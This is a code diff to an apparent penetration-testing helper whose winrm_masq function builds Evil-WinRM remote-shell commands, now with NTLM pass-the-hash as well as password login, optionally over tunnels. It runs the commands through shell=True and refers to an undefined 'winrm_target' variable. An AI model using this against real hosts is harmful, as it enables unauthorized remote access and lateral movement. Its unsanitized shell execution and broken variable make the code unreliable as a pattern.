@@ -296,8 +296,8 @@ def winrm_masq():
     """
     print("Initializing WinRM masquerade...")
     target_ip = text("Enter Target IP of WinRM:").ask()
-    username = text("Enter Username:").ask()
-    password = text("Enter Password:").ask()
+    winrm_username = text("Enter Username:").ask()
+    #password = text("Enter Password:").ask()
 
     # Prompt for tunneling
     if text("Do you need to tunnel the connection? (Y/N):").ask().lower() == "y":
@@ -330,16 +330,42 @@ def winrm_masq():
 
         # Use the first tunnel port for Evil-WinRM
         winrm_command_port = first_tunnel_port if tunnel_count > 1 else last_tunnel_port
-        print(f"DEBUG: Using tunnel port {winrm_command_port} for Evil-WinRM connection.")
-        winrm_command = f"evil-winrm -i 127.0.0.1 -u {username} -p {password}"
-    else:
-        # No tunneling: direct connection to target port 5985
-        target_port = 5985
-        winrm_command = f"evil-winrm -i {target_ip} -u {username} -p {password} -P {target_port}"
 
-    # Print and execute the Evil-WinRM command
-    print(f"Executing: {winrm_command}")
-    execute_command(winrm_command)
+        # Prompt for authentication type
+        auth_choice = select(
+            "How do you want to authenticate?",
+            choices=["Password", "Hashes"],
+            style=custom_style,
+        ).ask()
+
+        if auth_choice == "Password":
+            winrm_password = input("Enter WinRM Password: ")
+            command = (
+                f"evil-winrm -i 127.0.0.1 -u {winrm_username} -p {winrm_password}"
+            )
+        elif auth_choice == "Hashes":
+            winrm_hash = input("Enter NTLM Hash: ")
+            command = (
+                f"evil-winrm -i 127.0.0.1 -u {winrm_username} -H {winrm_hash}"
+            )
+    else:
+        # No tunneling
+        auth_choice = select(
+            "How do you want to authenticate?",
+            choices=["Password", "Hashes"],
+            style=custom_style,
+        ).ask()
+
+        if auth_choice == "Password":
+            winrm_password = input("Enter WinRM Password: ")
+            command = f"evil-winrm -i {winrm_target} -u {winrm_username} -p {winrm_password}"
+        elif auth_choice == "Hashes":
+            winrm_hash = input("Enter NTLM Hash: ")
+            command = f"evil-winrm -i {winrm_target} -u {winrm_username} -H {winrm_hash}"
+
+    # Execute the command
+    print("Executing:", command)
+    subprocess.run(command, shell=True)
 
 
 def main():
